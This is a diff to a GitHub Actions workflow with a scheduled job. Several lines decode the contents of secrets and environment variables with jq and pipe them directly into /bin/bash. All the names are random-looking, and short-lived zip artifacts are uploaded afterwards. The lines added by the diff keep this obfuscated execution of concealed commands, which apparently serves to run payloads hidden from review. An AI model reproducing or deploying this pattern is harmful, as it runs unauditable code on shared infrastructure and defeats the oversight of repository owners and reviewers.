@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '14 0,6,12,18 * * *'
+    - cron: '35 0,6,12,18 * * *'
 permissions:
   contents: read
   actions: read
@@ -24,20 +24,17 @@ jobs:
           fetch-depth: 1
       - name: Invoke
         env:
-          ruazc9117: ${{ secrets.ruazc9117 }}
+          js246: ${{ secrets.js246 }}
         run: |
-          printf '%s' "$ruazc9117" | jq -r .lnuq321 | /bin/bash
-          echo $y93 | jq -r .vu668 | /bin/bash
-          printf '%s' "$xts70669" | jq -r .tx6 | /bin/bash
-          echo $idlpw1 | jq -r .wvimh11142 | /bin/bash
-          echo $xh10049 | jq -r .wcr921 | /bin/bash
-          printf '%s' "$h7198" | jq -r .j98 | /bin/bash
-          printf '%s' "$egwz3" | jq -r .ncj2578 | /bin/bash
+          printf '%s' "$js246" | jq -r .iz3307 | /bin/bash
+          printf '%s' "$cbrin66" | jq -r .opnh900 | /bin/bash
+          echo $bqi5 | jq -r .vkdc4509 | /bin/bash
+          echo $xmxmu424 | jq -r .vx082 | /bin/bash
 
       - name: Store artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: Ebgfca3h
+          name: 2oZAZqiK
           path: "*.zip"
           retention-days: 1
